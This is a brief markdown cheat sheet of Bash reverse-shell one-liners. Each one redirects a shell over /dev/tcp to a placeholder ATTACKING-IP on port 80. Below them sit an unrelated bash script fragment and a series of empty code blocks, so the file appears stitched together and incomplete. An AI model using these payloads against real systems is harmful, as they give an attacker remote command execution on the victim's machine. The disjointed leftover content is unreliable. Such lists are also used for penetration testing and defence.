# Bash Reverse Shells

```
exec /bin/bash 0&0 2>&0

```
```

0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

```
```
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
```

#

```#!/bin/bash

###### CONFIG
ACCEPTED_HOSTS="/root/.hag_accepted.conf"
BE_VERBOSE=false

if [ "$UID" -ne 0 ]
then
 echo "Superuser rights required"
 exit 2
fi

genApacheConf(){
 echo -e "# Host ${HOME_DIR}$1/$2 :"
}

echo '"quoted"' | tr -d \" > text.txt

```

#

```

```

#

```

```

#

```

```

#

```

```

#

```

```

#

```

```

#

```

```
